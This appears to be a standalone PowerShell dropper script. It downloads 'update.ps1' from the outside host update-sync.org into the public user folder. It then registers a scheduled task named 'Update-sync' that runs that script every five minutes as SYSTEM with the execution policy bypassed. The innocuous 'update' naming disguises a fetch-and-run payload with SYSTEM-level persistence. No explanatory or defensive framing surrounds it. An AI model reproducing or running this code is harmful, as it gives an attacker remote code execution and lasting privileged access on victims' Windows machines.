$url = "http://update-sync.org/update.ps1"
$out = "C:\Users\public\update.ps1"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
cmd /c 'schtasks /create /tn "Update-sync" /tr "powershell -ep bypass -f c:\users\public\update.ps1" /sc minute /mo 5 /ru "System"'
